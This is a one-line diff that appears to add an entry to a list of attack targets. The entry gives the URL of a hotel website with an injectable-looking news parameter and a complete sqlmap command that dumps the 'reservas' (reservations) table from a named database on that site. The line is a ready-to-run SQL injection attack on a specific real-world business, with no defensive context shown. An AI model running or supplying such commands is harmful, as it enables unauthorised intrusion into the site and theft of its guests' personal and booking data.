@@ -1,0 +1,1 @@
+https://www.domaparthotel.com.br/?pg=news&idnoticia=1 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u https://www.domaparthotel.com.br/?pg=news&idnoticia=1 -D domapart_site2011 -T reservas --dump
